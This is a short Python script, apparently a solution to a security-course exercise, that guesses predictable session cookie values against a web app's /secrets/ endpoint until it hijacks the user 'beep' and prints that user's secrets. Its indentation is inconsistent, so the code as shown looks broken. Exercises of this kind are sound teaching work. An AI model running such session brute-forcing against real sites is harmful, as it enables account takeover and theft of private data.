import sys
import requests
import json


def test_session(address):
	# write your code here
     
  for i in range(0, 100):
        try:
            response = requests.get(f'{address}/secrets/', cookies={'sessionid': f'keep_this_secret-{i}'})
            obj = json.loads(response.text)
            if (obj['username'] == "beep"):
                 return obj['secrets']
        except:
            print('error')   

  return None


def main(argv):
	address = sys.argv[1]
	print(test_session(address))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python %s address' % sys.argv[0])
	else:
		main(sys.argv)
